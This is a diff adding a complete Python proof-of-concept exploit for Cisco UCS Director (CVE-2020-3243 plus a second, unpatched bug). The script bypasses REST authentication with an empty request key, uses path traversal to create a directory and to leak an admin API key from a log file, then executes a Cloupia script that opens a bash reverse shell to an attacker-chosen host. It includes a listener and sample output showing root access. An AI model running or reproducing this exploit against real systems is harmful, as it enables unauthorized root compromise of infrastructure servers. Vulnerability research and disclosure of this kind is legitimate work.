@@ -1,0 +1,192 @@
+#!/usr/bin/python
+"""
+Cisco UCS Director Cloupia Script Interpreter Remote Code Execution Vulnerability
+
+Tested on: Cisco UCS Director 6.7.3.0 VMWARE Evaluation
+- File: CUCSD_6_7_3_0_67414_VMWARE_SIGNED_EVAL.zip
+- Version: 6.7.3.0 VMWARE Evaluation (latest at the time)
+- MD5: 3f79463a654c91dbf4b620884e2a3b21
+- Size: 4355.99 MB (4567591797 bytes)
+- Download: https://software.cisco.com/download/home/286320555/type/285018084/release/6
+
+Bug 1: CVE-2020-3243 / ZDI-20-540
+Bug 2: N/A (unpatched)
+
+Example:
+========
+
+saturn:~ mr_me$ ./poc.py 
+(+) usage: ./poc.py <target> <connectback:port>
+(+) eg: ./poc.py 192.168.100.144 192.168.100.59
+(+) eg: ./poc.py 192.168.100.144 192.168.100.59:1337
+
+saturn:~$ ./poc.py 192.168.100.144 192.168.100.59:1337
+(+) created the exports directory!
+(+) found an admins rest api key: 0A7DB7EC61204627BB833CE07AEA0F4C
+(+) starting handler on port 1337
+(+) triggering reverse shell wait a sec...
+(+) connection from 192.168.100.144
+(+) pop thy shell!
+bash: no job control in this shell
+[root@localhost inframgr]# id
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=system_u:system_r:initrc_t:s0
+[root@localhost inframgr]#
+"""
+
+import re
+import sys
+import ssl
+import json
+import time
+import socket
+import requests
+import telnetlib
+from urllib import quote
+from threading import Thread
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def we_can_create_dir(t, path):
+    """ We use this primitive to create the exports directory required for the directory traversal.
+    Inside of RestAPI$MyCallable call method, we are hitting this line with `myfile` controlled:
+    /*  950 */       myfile.getParentFile().mkdirs();
+
+    I mentioned this is common and in this case, leads the path to full blown exploitation.
+    https://twitter.com/steventseeley/status/1173998009241276416 """
+
+    """ A URI starting with /cloupia/ instead of /api/ (ab)uses dispatcher.forward
+    in the com.cloupia.client.web.auth.urlfilter.RESTUrlRewriteFilter class and I teach this
+    access bypass technique in the `Full Stack Web Attack` class. """
+    uri = "https://%s/cloupia/api/rest" % t
+    p = {
+        "opName" : "userAPI:userAPIUnifiedImport",
+        "opData" : "{}",
+    }
+
+    """ An empty key slips past isEnableRestKeyAccessCheckForUser
+    method in the com.cloupia.client.web.RestAPI class. """
+    h = { "X-Cloupia-Request-Key" : "" }
+    dir_path = "../../../..%ssi" % path
+    f = {'hax': (dir_path, "whateva", 'text/x-spam')}
+    r = requests.post(uri, files=f, params=p, headers=h, verify=False)
+    try:
+        j = r.json()
+    except:
+        return False
+    if r.status_code == 200 and str(j['serviceError']).startswith("REMOTE_SERVICE_EXCEPTION: Cannot execute operation"):
+        return True
+    return False
+
+def leak_api_key(t):
+    """ This method leaks the logfile.txt file via the userAPIDownloadFile API.
+    Sometimes the logfile.txt can be huge so we chunk download over a raw socket the response
+    looking for our key, when it's found we can bail. """
+    op_data = {
+        "param0" : "../../../../../../../../opt/infra/idaccessmgr/logfile.txt" # we should have API keys in here!
+    }
+    p = '?opName=%s&opData=%s' % (quote("userAPI:userAPIDownloadFile"), quote(str(op_data)))
+    req = "GET /cloupia/api/rest%s HTTP/1.1\r\nHost: %s\r\nX-Cloupia-Request-Key:\x20\r\n\r\n" % (p, t)
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((t, 443))
+    s = ssl.wrap_socket(s)
+    s.send(req)
+    i = 0
+    while True:
+        i += 1
+        buf = s.recv(1024)
+        if not buf:
+            break
+
+        # search for an API key in the logs!
+        matches = re.findall("{.*}", buf)
+        if len(matches) > 0:
+            for match in matches:
+                try:
+                    j = json.loads(match)
+                    if j["loginName"] == "admin":
+                        if "restKey" in j:
+                            if j["restKey"] != None:
+                                return str(j["restKey"])
+                except ValueError:
+                    pass
+
+        """ If we haven't found the key after 1369088 bytes of 
+        downloaded logfile.txt, we have probably have failed! 
+        But it's very unlikley we will ever land here. """
+        if i == 1337:
+            break
+    s.close()
+    return False
+
+def execute_code(t, api_key, cb_host, cb_port):
+    """ By design remote code execution vulnerabilities are forever days. """
+    cmd = "\"bash -i >&#x26; /dev/tcp/%s/%d 0>&#x26;1\"" % (cb_host, cb_port)
+    js = 'var x = new java.lang.ProcessBuilder();x.command("bash", "-c", %s);x.start();' % cmd
+    xml = """<?xml version="1.0" encoding="UTF-8"?><cuicOperationRequest>
+    <operationType>EXECUTE_CLOUPIA_SCRIPT</operationType>
+    <payload>
+        <![CDATA[
+          <ExecuteCloupiaScript>
+          <label>test</label>
+          <script>%s</script>
+          <undoScript></undoScript>
+          </ExecuteCloupiaScript>
+          ]]>
+    </payload>
+    </cuicOperationRequest>""" % js
+    uri = "https://%s/cloupia/api-v2/generalActions" % t
+    h = {
+        "X-Cloupia-Request-Key" : api_key,
+        "Content-Type": "text/xml"
+    }
+    requests.post(uri, data=xml, headers=h, verify=False)
+
+def random_string(string_length = 8):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(string_length))
+
+def handler(lp):
+    print "(+) starting handler on port %d" % lp
+    t = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lp))
+    s.listen(1)
+    conn, addr = s.accept()
+    print  "(+) connection from %s" % addr[0]
+    t.sock = conn
+    print "(+) pop thy shell!"
+    t.interact()
+
+def main():
+    if len(sys.argv) != 3:
+        print "(+) usage: %s <target> <connectback:port>" % sys.argv[0]
+        print "(+) eg: %s 192.168.100.144 192.168.100.59" % sys.argv[0]
+        print "(+) eg: %s 192.168.100.144 192.168.100.59:1337" % sys.argv[0]
+        sys.exit(1)
+    t = sys.argv[1]
+    cb = sys.argv[2]
+    if not ":" in cb:
+        print "(+) using default connectback port 4444"
+        ls = cb
+        lp = 4444
+    else:
+        if not cb.split(":")[1].isdigit():
+            print "(-) %s is not a port number!" % cb.split(":")[1]
+            sys.exit(-1)
+        ls = cb.split(":")[0]
+        lp = int(cb.split(":")[1])
+
+    if we_can_create_dir(t, "/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/"):
+        print "(+) created the exports directory!"
+        api_key = leak_api_key(t)
+        if api_key:
+            print "(+) found an admins rest api key: %s" % api_key
+            handlerthr = Thread(target=handler, args=(lp,))
+            handlerthr.start()
+            time.sleep(0.1)
+            print "(+) triggering reverse shell wait a sec..."
+            execute_code(t, api_key, ls, lp)
+
+if __name__ == "__main__":
+    main()
